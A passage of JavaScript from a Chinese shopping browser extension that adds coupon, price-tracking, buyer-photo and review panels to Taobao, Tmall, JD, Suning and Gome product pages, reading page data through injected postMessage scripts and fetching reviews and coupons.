class="dypMid9527-must-see-footer"><p>已经到底啦</p></div></div><div class="dypMid9527-must-see-close-btn"></div><div class="dypMid9527-must-see-GoTop"></div></div>`;
                                        $("body").prepend(html);
                                        $(".dypMid9527-must-see-modal").click(function (event) {
                                            var hos = $(event.target).closest($(".dypMid9527-must-see-box")).length;
                                            var hos2 = $(event.target).closest($(".dypMid9527-must-see-close-btn")).length;
                                            var hos3 = $(event.target).closest($(".dypMid9527-must-see-GoTop")).length;
                                            if (!hos && !hos2 && !hos3) {
                                                $(".dypMid9527-must-see-modal").fadeOut();
                                                $("body").removeClass("dyp779946-body-unScroll");
                                            }
                                        }); //点击外面关闭
                                        $(".dypMid9527-must-see").on("click",function () {
                                            $(".dypMid9527-must-see-modal").show();
                                            $("body").addClass("dyp779946-body-unScroll");
                                            $(".dypMid9527-must-see-close-btn").css({"display":"block"});
                                        });
                                        //点击关闭整个模态框
                                        $(".dypMid9527-must-see-close-btn").on("click",function () {
                                            $(".dypMid9527-must-see-modal").hide();
                                            $("body").removeClass("dyp779946-body-unScroll");
                                        });
                                        $(".dypMid9527-must-see-GoTop").on("click",function () {
                                            $('.dypMid9527-must-see-modal').animate({scrollTop:0},'slow');
                                        });
                                        $(".dypMid9527-must-see-modal").scroll(function () {
                                            var tops = $(this).scrollTop();
                                            tops > 800 ? $(".dypMid9527-must-see-GoTop").css("display","block") : $(".dypMid9527-must-see-GoTop").css("display","none");
                                        });
                                        //鼠标划过查看必看评价筛选规则
                                        $(".dypMid9527-must-see-head-total").hover(function () {
                                            $(".dypMid9527-question-dialog").css({"display":"block"});
                                            $(".dypMid9527-must-see-modal .arrow_1").css({"display":"block"});
                                            $(".dypMid9527-must-see-modal .arrow_2").css({"display":"block"});
                                        },function () {
                                            $(".dypMid9527-question-dialog").css({"display":"none"});
                                            $(".dypMid9527-must-see-modal .arrow_1").css({"display":"none"});
                                            $(".dypMid9527-must-see-modal .arrow_2").css({"display":"none"});
                                        });
                                        //鼠标点击评论图片查看大图
                                        $(".dypMid9527-cip-comment-item img").on("click",function () {
                                            $(this).parent().css("border-color","red");
                                            $(this).parent().siblings().css("border-color","rgb(255,255,255)");
                                            var imgsrc = $(this).attr("src");
                                            $(this).parent().parent().next().css("display","block");
                                            $(this).parent().parent().next().children("img").attr("src",imgsrc);
                                            if (locHost.indexOf("detail.tmall") !== -1) {
                                                var widths = $(this).parent().parent().next().children("img").width() - 60 + 'px';
                                                $(this).parent().parent().next().children("img").next().next().css("left",widths);
                                            }
                                        });
                                        //大图左侧下一张触摸
                                        $(".dypMid9527-cip-comment-img-switch-btn-left").hover(function () {
                                            FindImg($(this),".dypMid9527-cip-comment-img-prev-btn",0);
                                        },function () {
                                            $(".dypMid9527-cip-comment-img-prev-btn").css({"display":"none"});
                                        });
                                        //大图右侧下一张触摸
                                        $(".dypMid9527-cip-comment-img-switch-btn-right").hover(function () {
                                            FindImg($(this),".dypMid9527-cip-comment-img-next-btn",1);
                                        },function () {
                                            $(".dypMid9527-cip-comment-img-next-btn").css({"display":"none"});
                                        });
                                        //判断当前是第几张图
                                        function FindImg(e,n,t) {
                                            var nowimg = e.siblings("img").attr("src");
                                            var imgs = e.parent().prev().find("img");
                                            t == 0 ? t = 0 : t = imgs.length - 1;
                                            $.each(imgs,function (k,v) {
                                                if (v.getAttribute("src") == nowimg) {
                                                    if (k == t) {
                                                        e.find(n).css({"display":"none"});
                                                    } else {
                                                        e.find(n).css({"display":"block"});
                                                    }
                                                }
                                            });
                                        }   //
                                        //上一张大图
                                        $(".dypMid9527-cip-comment-img-prev-btn").on("click",function () {
                                            FindNowImg($(this),1);
                                        });
                                        //下一张大图
                                        $(".dypMid9527-cip-comment-img-next-btn").on("click",function () {
                                            FindNowImg($(this),2);
                                        });
                                        //判断当前图片
                                        function FindNowImg(e,n) {
                                            var imgEle = e.parent().siblings("img");
                                            var nowimg = imgEle.attr("src");
                                            var imgs = e.parent().parent().prev().find("img");
                                            n == 1 ? n = -1 : n = 1;
                                            $.each(imgs,function (k,v) {
                                                if (v.getAttribute("src") == nowimg) {
                                                    //获取下一张或上一张图片;并设置当前选中样式
                                                    var nm = imgs[k + n];
                                                    var $nm = $(nm);
                                                    $nm.parent().attr("style","border-color:red");
                                                    $nm.parent().siblings().attr("style","border-color:rgb(255,255,255)");
                                                    imgEle.attr("src",imgs[k + n].getAttribute("src"));
                                                    //最后一张或第一张;隐藏点击箭头
                                                    if (k == 1) {
                                                        $(".dypMid9527-cip-comment-img-prev-btn").css({"display":"none"});
                                                    }
                                                    if (k == imgs.length - 2) {
                                                        $(".dypMid9527-cip-comment-img-next-btn").css({"display":"none"});
                                                    }
                                                }
                                            });
                                        }
                                    }
                                }
                            }
                        },2500)
                    }       //中间(必看评价);
                    function creatBottom(e,t) {
                        $(function () {
                            setTimeout(function () {
                                if (creatBottomSign == 0) {
                                    var bottomTemplateHtml = `<div id="dypBot9527">
                                        <div class="dypBot9527-icon"></div>
                                        <div class="dypBot9527-coupon"></div>
                                        <div class="dypBot9527-biKan"></div>
                                        <div class="dypBot9527-buyerShow"></div>
                                    </div>`;
                                    if (locHost == "detail.ju.taobao.com") {
                                        $(".detail-detail .dd-header").append(bottomTemplateHtml);
                                    } else {
                                        $("#J_TabBar").append(bottomTemplateHtml);
                                    }
                                    creatBottomSign = 1;
                                    if (locHost == "item.taobao.com") {
                                        $(document).on("scroll",function () {
                                            if (($("#J_TabBarWrap").css("position") == "fixed")) {
                                                $("#dypBot9527").css({"float":"right","marginTop":50,"marginRight":188 - $("#dypBot9527").width()});
                                            } else {
                                                $("#dypBot9527").css({"float":"left","marginTop":0,"marginRight":0});
                                            }
                                        })
                                    }
                                }
                                if (t == 1) {
                                    var qrUrls = 'https://uland.taobao.com/coupon/edetail?e=' + getParam(e.clickUrl,"e");
                                    var urls = 'https://uland.taobao.com/coupon/edetail?e=' + getParam(dyClickUrl.clickUrl,"e");
                                    $(".dypBot9527-coupon").html(`<a data-douyababapaopao="底部-优惠券">领券<span> ${e.couponAmount / 100}元</span></a>
                                    <div class="dypBot9527-coupon-qr">
                                        <div class="dypBot9527-coupon-qrT">淘宝APP扫码领券</div>
                                        <div class="dypBot9527-coupon-qrB" id="dypBot9527-coupon-qrB"></div>
                                    </div>`);
                                    $(".dypBot9527-coupon").fadeIn();
                                    new QRCode(document.getElementById("dypBot9527-coupon-qrB"),{
                                        text:qrUrls,
                                        width:130,
                                        height:130,
                                        colorDark:"#000000",
                                        colorLight:"#ffffff",
                                        correctLevel:QRCode.CorrectLevel.L
                                    });
                                    $('.dypBot9527-coupon').click(function () {
                                        openWindow(urls)
                                    });
                                    $('.dypBot9527-coupon').hover(function () {
                                        $("#J_TabBarWrap").addClass("dyp-zindex");
                                        $(".dypBot9527-coupon-qr").show();
                                    },function () {
                                        $("#J_TabBarWrap").removeClass("dyp-zindex");
                                        $(".dypBot9527-coupon-qr").hide();
                                    });
                                }
                                if (t == 2) {
                                    $(".dypBot9527-buyerShow").html(`<a data-douyababapaopao="底部-买家秀">买家秀<span> ${e}</span></a>`);
                                    $(".dypBot9527-buyerShow").fadeIn();
                                    $(".dypBot9527-buyerShow").on("click",function () {
                                        $(".dypMid9527-buyers-show").click();
                                    });
                                }
                                if (t == 3) {
                                    $(".dypBot9527-biKan").html(`<a data-douyababapaopao="底部-必看评价">必看评价<span> ${e}</span></a>`);
                                    $(".dypBot9527-biKan").fadeIn();
                                    $(".dypBot9527-biKan").on("click",function () {
                                        $(".dypMid9527-must-see").click();
                                    });
                                }
                            },5000);
                        });
                    }     //加入购物车旁边的优惠券和买家秀和必看评价
                }();    //淘宝天猫页面
                !function () {
                    var productId;
                    if (infoGroup.plat != 'jd') {
                        return;
                    }
                    $(".dypMid9527-must-see").hide();
                    $(".dypMid9527-buyers-show").show();
                    changeColor("#B61D1D","京　东","jd");
                    $("#dypMid9527").css("z-index",11);
                    $(".dypMid9527-title.feast span").css('max-width','52px');
                    var myScript = document.createElement("script");
                    myScript.type = "text/javascript";
                    myScript.appendChild(document.createTextNode('window.postMessage({"douyapuImgs":pageConfig.product.imageList,"douyapuId":pageConfig.product.skuid,"douyapuShopId":pageConfig.product.shopId,"douyapuVenderId":pageConfig.product.venderId,"douyapuCat":pageConfig.product.cat},"*")'));
                    document.body.appendChild(myScript);
                    window.addEventListener("message",function (event) {
                        if (event.data.douyapuId) {
                            productId = event.data.douyapuId;
                            infoGroup.id = event.data.douyapuId;
                            $.ajax({
                                url:"https://p.3.cn/prices/mgets?skuIds=J_" + productId,
                                type:'GET',
                                dataType:'json',
                                success:function (e) {
                                    infoGroup.price = e[0].p;
                                    getJdCoupon(event);
                                    getJdBuyShow(event);
                                    startPrice(location.href);
                                }
                            });
                        }
                    },false);
                    startSame(location.href);         //京东页面同款数据
                    startVip();
                    function getJdBuyShow(e) {
                        var id = e.data.douyapuId;
                        var requestUrl = 'https://sclub.jd.com/comment/productPageComments.action?score=0&sortType=5&pageSize=10&isShadowSku=0&fold=1&productId=' + id + '&page=';
                        var totalNum;
                        var showKaiguan = 1;
                        $.ajax({
                            type:"get",
                            dataType:"json",
                            url:requestUrl + 0,
                            success:function (data) {
                                // saveCoupon(e,data);
                                totalNum = data.productCommentSummary.showCount;
                                if (totalNum > 999) {
                                    totalNum = "999+";
                                }
                                $("#dypMid9527 .dypMid9527-buyers-show .dypMid9527-title span").fadeOut(function () {
                                    $(this).html('买家秀<span style="color:#ff0033;font-size: 12px;font-weight: bold;margin-left:2px; ">' + totalNum + '</span>').fadeIn(1000);
                                });
                                var html = `<div id="dyp779946-fix-full" class="dyp779946-fix-full">
                                    <div id="dyp779946-container-box">
                                        <div class="dyp779946-header clearfix">
                                            <div class="dyp779946-header-title"></div>
                                            <div class="dyp779946-header-num">为您找到所有买家秀共<span class="color-red">${totalNum}</span>张</div>
                                        </div>
                                        <div id="dyp779946-waterfall-box">
                                        </div>
                                    </div>
                                    <div id="dyp779946-detail-box">
                                    </div>
                                    <div class="dyp779946-close-button"></div>
                                    <div class="dyp779946-scroll-top">
                                        <p class="scroll"></p>
                                        <p class="qq"></p>
                                    </div>
                                </div>`;
                                if (totalNum) {
                                    //买家秀按钮点击
                                    $("#dypMid9527 .dypMid9527-buyers-show").on("click",function () {
                                        $("body").addClass("dyp779946-body-unScroll");
                                        $("#dyp779946-fix-full").css("visibility","visible");
                                        $("#dyp779946-fix-full").fadeIn();
                                    });
                                    $("body").prepend(html);
                                } else {
                                    //买家秀按钮点击
                                    $(".dypMid9527-buyers-show").hide();
                                    var htmlTpl = `<div class="dypMid9527-no-buyers-show">暂未发现买家秀</div>`;
                                    var clickSign = 0;
                                    $("#dypMid9527 .dypMid9527-buyers-show .dypMid9527-title").append(htmlTpl);
                                    $("#dypMid9527 .dypMid9527-buyers-show").on("click",function () {
                                        if (!clickSign) {
                                            clickSign = 1;
                                            $("#dypMid9527 .dypMid9527-no-buyers-show").fadeIn(function () {
                                                setTimeout(function () {
                                                    $("#dypMid9527 .dypMid9527-no-buyers-show").fadeOut(function () {
                                                        clickSign = 0;
                                                    });
                                                },2000);
                                            });
                                        }
                                    });
                                }
                                var sortNum = 0;
                                $('#dyp779946-waterfall-box').waterfall({
                                    itemCls:'item',
                                    colWidth:250,
                                    gutterWidth:10,
                                    gutterHeight:10,
                                    isAutoPrefill:true,
                                    checkImagesLoaded:true,
                                    path:function (page) {
                                        return requestUrl + (page - 1);
                                    },
                                    dataType:'json',
                                    loadingMsg:'<div style="text-align:center;padding:10px 0; color:#999;"><img src="data:image/gif;base64,R0lGODlhEAALAPQAAP///zMzM+Li4tra2u7u7jk5OTMzM1hYWJubm4CAgMjIyE9PT29vb6KiooODg8vLy1JSUjc3N3Jycuvr6+Dg4Pb29mBgYOPj4/X19cXFxbOzs9XV1fHx8TMzMzMzMzMzMyH5BAkLAAAAIf4aQ3JlYXRlZCB3aXRoIGFqYXhsb2FkLmluZm8AIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAALAAAFLSAgjmRpnqSgCuLKAq5AEIM4zDVw03ve27ifDgfkEYe04kDIDC5zrtYKRa2WQgAh+QQJCwAAACwAAAAAEAALAAAFJGBhGAVgnqhpHIeRvsDawqns0qeN5+y967tYLyicBYE7EYkYAgAh+QQJCwAAACwAAAAAEAALAAAFNiAgjothLOOIJAkiGgxjpGKiKMkbz7SN6zIawJcDwIK9W/HISxGBzdHTuBNOmcJVCyoUlk7CEAAh+QQJCwAAACwAAAAAEAALAAAFNSAgjqQIRRFUAo3jNGIkSdHqPI8Tz3V55zuaDacDyIQ+YrBH+hWPzJFzOQQaeavWi7oqnVIhACH5BAkLAAAALAAAAAAQAAsAAAUyICCOZGme1rJY5kRRk7hI0mJSVUXJtF3iOl7tltsBZsNfUegjAY3I5sgFY55KqdX1GgIAIfkECQsAAAAsAAAAABAACwAABTcgII5kaZ4kcV2EqLJipmnZhWGXaOOitm2aXQ4g7P2Ct2ER4AMul00kj5g0Al8tADY2y6C+4FIIACH5BAkLAAAALAAAAAAQAAsAAAUvICCOZGme5ERRk6iy7qpyHCVStA3gNa/7txxwlwv2isSacYUc+l4tADQGQ1mvpBAAIfkECQsAAAAsAAAAABAACwAABS8gII5kaZ7kRFGTqLLuqnIcJVK0DeA1r/u3HHCXC/aKxJpxhRz6Xi0ANAZDWa+kEAA7" alt=""><br />加载中...</div>',
                                    callbacks:{
                                        loadingStart:function ($loading) {
                                            $loading.show();
                                        },
                                        loadingFinished:function ($loading,isBeyondMaxPage) {
                                            if (!isBeyondMaxPage) {
                                                $loading.fadeOut();
                                            } else {
                                                $loading.remove();
                                            }
                                        },
                                        loadingError:function ($message) {
                                            $message.html('请稍后重试');
                                        },
                                        renderData:function (data) {
                                            var res = data.comments;
                                            var oli = "";
                                            if ((res && res.length == 0) || !res) {
                                                $('#dyp779946-waterfall-box').waterfall('pause',function () {
                                                });
                                                return oli;
                                            }
                                            $.each(res,function (key,value) {
                                                if (value.images && value.images.length > 0) {
                                                    sortNum += 1;
                                                    var thumbnailPics = '';
                                                    var addComment = '';
                                                    var addPics = '';
                                                    thumbnailPics += '<div class="thumbnail">';
                                                    $.each(value.images,function (key,value) {
                                                        if (key == 5) {
                                                            return false;
                                                        }
                                                        thumbnailPics += `<img class="thumbnail-item" src=${value.imgUrl.replace(/((\d+)x(\d+))/,"40x40")} data-num="${sortNum}" data-newnum="${key}">`;
                                                    });
                                                    thumbnailPics += '</div>';
                                                    if (value.afterUserComment && value.afterUserComment.content) {
                                                        if (value.afterImages && value.afterImages.length > 0) {
                                                            addPics += '<div class="add-comment-thumbnail">';
                                                            $.each(value.afterImages,function (key,value) {
                                                                if (key == 5) {
                                                                    return false;
                                                                }
                                                                addPics += `<img class="thumbnail-item" src=${value.imgUrl.replace(/((\d+)x(\d+))/,"40x40")} data-num="${sortNum}">`;
                                                            });
                                                            addPics += '</div>';
                                                        }
                                                        addComment = `<div class="add-comment">
                                                            <div class="add-comment-title">追加 评论</div>
                                                            <div class="add-comment-content">${value.afterUserComment.hAfterUserComment.content}</div>
                                                            ${addPics}
                                                        </div>`;
                                                    }
                                                    oli += `<div class="item">
                                                        <div class="top">
                                                            <img src="${value.images[0].imgUrl.replace(/((\d+)x(\d+))/,"640x480").replace(/n0/,"shaidan")}" data-num="${sortNum}" data-newnum="0" data-douyababapaopao="工具+买家秀+点击详情">
                                                        </div>
                                                        <div class="middle">
                                                            ${thumbnailPics}
                                                            <div class="comment">
                                                                <span title="${value.content}">${value.content}</span>
                                                            </div>
                                                            ${addComment}
                                                        </div>
                                                        <div class="bottom">
                                                            <div class="use-logo"><b style="background: url(https://${value.userImageUrl});background-size:100%"></b></div>
                                                            <div class="bottom-right">
                                                                <div class="use-name">${value.nickname}</div>
                                                                <div class="model-param" title="${value.productColor}">${value.productColor}</div>
                                                            </div>
                                                        </div>
                                                    </div>`;
                                                }
                                            });
                                            return oli;
                                        }
                                    }
                                });
                                $("#dyp779946-fix-full").on("click",".thumbnail-item",function () {
                                    var height = $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').height();
                                    $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').height(height);
                                    $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').attr("src",$(this).attr("src").replace(/((\d+)x(\d+))/,"640x480").replace(/n0/,"shaidan"));
                                    $('#dyp779946-fix-full .top img[data-num=' + $(this).data("num") + ']').data("newnum",$(this).data("newnum"));
                                    $(this).addClass("active").siblings().removeClass("active");
                                });
                                $("#dyp779946-fix-full").on("click",".top img",function () {
                                    var index = $(this).data("newnum");
                                    var num = $(this).data("num");
                                    var total = $('#dyp779946-fix-full .thumbnail img[data-num=' + $(this).data("num") + ']').length;
                                    var titleSwitch = "block";
                                    showKaiguan = 0;
                                    var detailComment = $(this).parent().parent().children(".middle").children(".comment").text();
                                    var detailAddComment = $(this).parent().parent().children(".middle").children(".add-comment").children(".add-comment-content").text();
                                    var mainPic = $(this).attr("src");
                                    if (!detailAddComment) {
                                        titleSwitch = "none";
                                    }
                                    var thumbHtml = $(this).parent().parent().children(".middle").children(".thumbnail").children("img");
                                    var newThumbHtml = "";
                                    $.each(thumbHtml,function (v,k) {
                                        var item = k.attributes.src.value.replace(/((\d+)x(\d+))/,"130x130");
                                        if (k.attributes["data-newnum"].value == index) {
                                            newThumbHtml += `<div class="active"><img src=${item} data-newnum="${v}" data-num="${num}"></div>`
                                        } else {
                                            newThumbHtml += `<div class=""><img src=${item} data-newnum="${v}" data-num="${num}"></div>`
                                        }
                                    });
                                    var detailHtml = `<div class="dyp779946-header clearfix">
                                        <div class="dyp779946-header-title"></div>
                                    </div>
                                    <div id="dyp779946-waterfallDetail-box">
                                        <div class="dyp779946-waterfallDetail-back">
                                            <div class="dyp779946-waterfallDetail-img">
                                                <img src="${mainPic}" alt="" data-newnum="${index}" data-num="${num}">
                                                <div class="dyp779946-waterfallDetail-title dypTrans">
                                                    <p class="dypBold">初次评论</p>
                                                    <p class="dypAnimate" id="dypMjxAnimate">${detailComment}</p>
                                                    <p class="dypBold dyp-topMargin" style="display: ${titleSwitch}">追评</p>
                                                    <p style="display: ${titleSwitch}">${detailAddComment}</p>
                                                </div>
                                            </div>
                                            <button class="l" data-douyababapaopao="工具+买家秀+详情左翻页"></button>
                                            <button class="r" data-douyababapaopao="工具+买家秀+详情右翻页"></button>
                                            <div class="dyp779946-waterfallDetail-page"><span id="dyp779946-waterfallDetail-now">${index + 1}</span>/${total}</div>
                                        </div>
                                        <div class="clearfix dyp-detail-thumb">
                                            ${newThumbHtml}
                                        </div>
                                    </div>`;
                                    $("#dyp779946-detail-box").html(detailHtml);
                                    $("#dyp779946-container-box").hide();
                                    $("#dyp779946-detail-box").show();
                                    $(".dyp-detail-thumb").on("click","div",function () {
                                        $(".dyp779946-waterfallDetail-img img").attr("src",$(this).children().attr("src").replace(/((\d+)x(\d+))/,"640x480").replace(/n0/,"shaidan"));
                                        $(".dyp-detail-thumb").children().removeClass("active");
                                        $(this).addClass("active");
                                    });
                                });
                                $("#dyp779946-detail-box").on("click","button.r",function () {
                                    $(".dyp779946-waterfallDetail-back button").show();
                                    if ($(".dyp-detail-thumb>div.active").next().length) {
                                        $(".dyp-detail-thumb>div.active").next().click();
                                    } else {
                                        var index = $(this).parent().children(".dyp779946-waterfallDetail-img").children("img").data("num");
                                        if ($('#dyp779946-waterfall-box .top img[data-num=' + index + ']').parent().parent().next().length) {
                                            index += 1;
                                            $('#dyp779946-waterfall-box .top img[data-num=' + index + ']').click();
                                            $(".dyp-detail-thumb>div:first").click();
                                        } else {
                                            $(".dyp779946-waterfallDetail-back button.r").hide();
                                        }
                                    }
                                    $("#dyp779946-waterfallDetail-now").html($(".dyp-detail-thumb>div.active img").data("newnum") + 1)
                                });
                                $("#dyp779946-detail-box").on("click","button.l",function () {
                                    $(".dyp779946-waterfallDetail-back button").show();
                                    if ($(".dyp-detail-thumb>div.active").prev().length) {
                                        $(".dyp-detail-thumb>div.active").prev().click();
                                    } else {
                                        var index = $(this).parent().children(".dyp779946-waterfallDetail-img").children("img").data("num");
                                        if ($('#dyp779946-waterfall-box .top img[data-num=' + index + ']').parent().parent().prev().length) {
                                            index -= 1;
                                            $('#dyp779946-waterfall-box .top img[data-num=' + index + ']').click();
                                            $(".dyp-detail-thumb>div:last").click();
                                        } else {
                                            $(".dyp779946-waterfallDetail-back button.l").hide();
                                        }
                                    }
                                    $("#dyp779946-waterfallDetail-now").html($(".dyp-detail-thumb>div.active img").data("newnum") + 1)
                                });
                                $("#dyp779946-detail-box").on("mouseenter",".dyp779946-waterfallDetail-title",function () {
                                    $("#dypMjxAnimate").removeClass("dypAnimate");
                                    $(this).css({"height":"auto"});
                                    var height = $(this).css("height");
                                    $(this).css({"height":"89px"}).stop().animate({
                                        height:height
                                    },500);
                                });
                                $("#dyp779946-detail-box").on("mouseleave",".dyp779946-waterfallDetail-title",function () {
                                    $("#dypMjxAnimate").addClass("dypAnimate");
                                    $(this).stop().animate({
                                        height:"89px"
                                    },500);
                                });
                                $("#dyp779946-fix-full").on("click",".dyp779946-close-button",function () {
                                    if ($("#dyp779946-detail-box")[0].style.display == "block") {
                                        showKaiguan = 1;
                                        $("#dyp779946-container-box").show();
                                        $("#dyp779946-detail-box").hide();
                                    } else {
                                        $("#dyp779946-fix-full").fadeOut();
                                        $("body").removeClass("dyp779946-body-unScroll");
                                    }
                                });
                                $("#dyp779946-fix-full .dyp779946-scroll-top").on("click","p.scroll",function () {
                                    $("#dyp779946-fix-full").animate({
                                        'scrollTop':'0px'
                                    },300)
                                });
                                $("#dyp779946-fix-full .dyp779946-scroll-top").on("click","p.qq",function () {
                                    window.open("//shang.qq.com/wpa/qunwpa?idkey=07df4060e4b8ca7215881d58e29bdaad66177f17a11a82484c3dfa9168ebc2d2");
                                });
                                $("#dyp779946-fix-full").click(function (event) {
                                    var hos = $(event.target).closest($("#dyp779946-container-box")).length;
                                    var hos2 = $(event.target).closest($("#dyp779946-fix-full .dyp779946-scroll-top")).length;
                                    var hos3 = $(event.target).closest($("#dyp779946-fix-full .dyp779946-close-button")).length;
                                    var hos4 = $(event.target).closest($("#dyp779946-detail-box")).length;
                                    if (!hos && !hos2 && !hos3 && showKaiguan == 1) {
                                        $("#dyp779946-fix-full").fadeOut();
                                        $("body").removeClass("dyp779946-body-unScroll");
                                    } else if (!hos && !hos2 && !hos3 && !hos4 && showKaiguan == 0) {
                                        if ($(event.target)[0].tagName != "BUTTON") {
                                            showKaiguan = 1;
                                            $("#dyp779946-container-box").show();
                                            $("#dyp779946-detail-box").hide();
                                        }
                                    }
                                });
                            }
                        });
                    }    //中间(京东买家秀)
                    function getJdCoupon(e) {
                        a();
                        function a() {
                            $.getJSON(mainUrl.jdCoupon,{
                                skuId:e.data.douyapuId,
                                area:"1_72_2799_0",
                                shopId:e.data.douyapuShopId,
                                venderId:e.data.douyapuVenderId,
                                cat:e.data.douyapuCat.toString()
                            },function (d) {
                                if (d.skuCoupon && d.skuCoupon.length) {
                                    var data = d.skuCoupon[0];
                                    if (!data.url) {
                                        data.url = "javascript:void(0);";
                                        $("#dypMid9527 .dypMid9527-box-coupon").on("click",$("#dypButton"),function () {
                                            $("div[data-name=coupon]").click();
                                        })
                                    } else {
                                        data.url = "http://coupon.m.jd.com/coupons/show.action?" + data.url.split("?")[1];
                                    }
                                    append(data);
                                    appendPriceCut(1); //京东有
                                } else {
                                    var oli1 = `<p class="dypClear">
                                        <a href="${mainUrl.website}" class="fr" target="_blank" data-douyababapaopao="工具+优惠券+更多">
                                            <span class="dypMid9527-coupon-topIcon"></span><span>更多优惠券>></span>
                                        </a>
                                    </p>
                                    <div class="dypMid9527-no-coupon">
                                        <b class="dypMid9527-has-no"></b>
                                        <span>不好意思 , 暂无可用的优惠券</span>
                                    </div>`;
                                    $("#dypMid9527 .dypMid9527-box-coupon").html(oli1);
                                    $("#dypMid9527 .dypMid9527-box-coupon").append(`<div class="dypMid9527-erweima-mask"></div>`);
                                    appendPriceCut(2); //京东无
                                }
                            }); //
                        }   //
                        function append(data) {
                            var oli = `<p class="dypClear">
                                    <a href="${mainUrl.website}" class="fr" target="_blank" data-douyababapaopao="工具+优惠券+更多">
                                        <span class="dypMid9527-coupon-topIcon"></span><span>更多优惠券>></span>
                                    </a>
                                </p>
                            <div class="dypClear">
                                <a href="${data.url}" target="_blank" data-douyababapaopao="工具+优惠券+领取" id="dypButton">
                                    <div class="fl dypMid9527-coupon-backImg">
                                        <p class="p1"><i></i><span>${data.discount}</span>优惠券</p>
                                        <p><span>满${data.quota}减${data.discount}元</span></p>
                                    </div>
                                </a>
                                <div class="fl dypMid9527-coupon-right">
                                    <p>
                                        券后价 <span class="dypMid9527-coupon-price"> ${numSub(infoGroup.price,data.discount)}</span>
                                        <span class="font-color-ff0033"> 元</span>
                                    </p>
                                    <div class="dypClear">
                                        <p class="fl">还剩&nbsp;：</p>
                                        <p id="dypMid9527-fnTimeCountDown" class="fl">
                                            <span class="day">00</span><span class="dypMid9527-c-2c2c2c">日</span>
                                            <span class="hour">00</span><span class="dypMid9527-c-2c2c2c">时</span>
                                            <span class="mini">00</span><span class="dypMid9527-c-2c2c2c">分</span>
                                            <span class="sec">00</span>.<span class="hm">0</span><span class="dypMid9527-c-2c2c2c">秒</span>
                                        </p>
                                    </div>
                                </div>
                            </div>`;
                            $("#dypMid9527 .dypMid9527-box-coupon").html(oli);
                            $("#dypMid9527 .dypMid9527-box-coupon").append(`<div class="dypMid9527-erweima-mask"></div>`);
                            $("#dypMid9527 .dypMid9527-coupon .dypMid9527-title span").fadeOut(function () {
                                $(this).html(`领${data.discount}元劵`).css({
                                    "color":"#ff0033",
                                    "fontWeight":"bold"
                                }).fadeIn();
                            });
                            $("#dypMid9527-fnTimeCountDown").fnTimeCountDown(data.endTime.split(" ")[0] + " 23:59:59");
                        }   //
                    }     //中间京东优惠券
                    function saveCoupon(event,data) {
                        $.ajax({
                            url:"https://app.douyapu.com/api/jd",
                            type:"get",
                            dataType:"json",
                            data:{itemId:productId},
                            success:function (d) {
                                if (d && d.status != 1) {
                                    return
                                }
                                $.ajax({
                                    url:d.api,
                                    type:"get",
                                    dataType:"json",
                                    success:function (e) {
                                        try {
                                            e = JSON.parse(e.jingdong_service_promotion_goodsInfo_responce.getpromotioninfo_result);
                                            if (e.sucessed != true) {
                                                return
                                            }
                                            e = e.result[0];
                                            var postData = {
                                                clickUrl:"",shareUrl:"",amount:"",discountPrice:e.unitPrice,itemId:e.skuId,
                                                picUrl:JSON.stringify({picUrl:e.imgUrl,detailImg:event.data.douyapuImgs}),reservePrice:"",title:e.goodsName,
                                                userId:e.shopId,cat:e.cid,type:2,biz30Day:e.inOrderCount,
                                                effectiveEndTime:"",effectiveStartTime:"",startFee:"",rate:""
                                            };
                                            var goodRate = data.productCommentSummary ? (data.productCommentSummary.goodCount / data.productCommentSummary.commentCount * 100).toFixed(2) : 0;
                                            postData.rate = {
                                                sale:e.inOrderCount,
                                                favCount:"",
                                                picNum:event.data.douyapuImgs.length,
                                                goodRate:goodRate
                                            };
                                            // console.log(postData);
                                            if ((!sessionStorage.douyapuControl || sessionStorage.douyapuControl != infoGroup.id) && dypmyswi) {
                                                chrome.extension.sendMessage({
                                                    name:"universal",
                                                    url:mainUrl.storage,
                                                    type:"post",
                                                    dataType:"json",
                                                    data:{
                                                        coupon:JSON.stringify(postData),
                                                    }
                                                },function () {
                                                });
                                                sessionStorage.douyapuControl = infoGroup.id;
                                            }
                                        } catch (err) {
                                        }
                                    }
                                });
                            }
                        });
                    }    //入库商品数据
                }();    //京东页面
                !function () {
                    if (infoGroup.plat != 'sn') {
                        return;
                    }
                    var myScript = document.createElement("script");
                    myScript.type = "text/javascript";
                    myScript.appendChild(document.createTextNode('window.postMessage({"douyapuPrice":sn},"*")'));
                    document.body.appendChild(myScript);
                    window.addEventListener("message",function (event) {
                        if (event.data.douyapuPrice) {
                            if (event.data.douyapuPrice.promotionPrice) {
                                infoGroup.id = event.data.douyapuPrice.partNumber;
                                infoGroup.price = event.data.douyapuPrice.promotionPrice;
                                startPrice(location.origin + location.pathname);
                            } else {
                                $(window).load(function () {
                                    infoGroup.price = $(".mainprice").text().split("¥")[1];
                                    startPrice(location.origin + location.pathname);
                                });
                            }
                        }
                    },false);
                    startSame(location.origin + location.pathname); //苏宁
                    qtCoupon();
                    startVip();
                }();    //苏宁易购页面
                !function () {
                    if (infoGroup.plat != 'gm') {
                        return;
                    }
                    $("#dypMid9527").css("z-index",105);
                    var myScript = document.createElement("script");
                    myScript.type = "text/javascript";
                    myScript.appendChild(document.createTextNode('window.postMessage({"douyapuPrice":prdInfo},"*")'));
                    document.body.appendChild(myScript);
                    window.addEventListener("message",function (event) {
                        if (event.data.douyapuPrice) {
                            if (parseFloat(event.data.douyapuPrice.gomePrice)) {
                                infoGroup.id = event.data.douyapuPrice.prdId + '_' + event.data.douyapuPrice.sku;
                                infoGroup.price = event.data.douyapuPrice.gomePrice;
                                startPrice(location.origin + location.pathname);
                            } else {
                                $(window).load(function () {
                                    infoGroup.price = $("#prdPrice").text().split("¥")[1];
                                    startPrice(location.origin + location.pathname);
                                });
                            }
                        }
                    },false);
                    startSame(location.origin + location.pathname); //国美
                    qtCoupon();
                    startVip();
                }();    //国美页面
                !function () {
                    if (infoGroup.plat != 'dd') {
                        return;
                    }
                    $("#dypMid9527").css("z-index",6667);
                    var myScript = document.createElement("script");
                    myScript.type = "text/javascript";
                    myScript.appendChild(document.createTextNode('window.postMessage({"douyapuPrice":prodSpuInfo},"*")'));
                    document.body.appendChild(myScript);
                    window.addEventListener("message",function (event) {
                        if (event.data.douyapuPrice) {
                            var spuInfo = event.data.douyapuPrice;
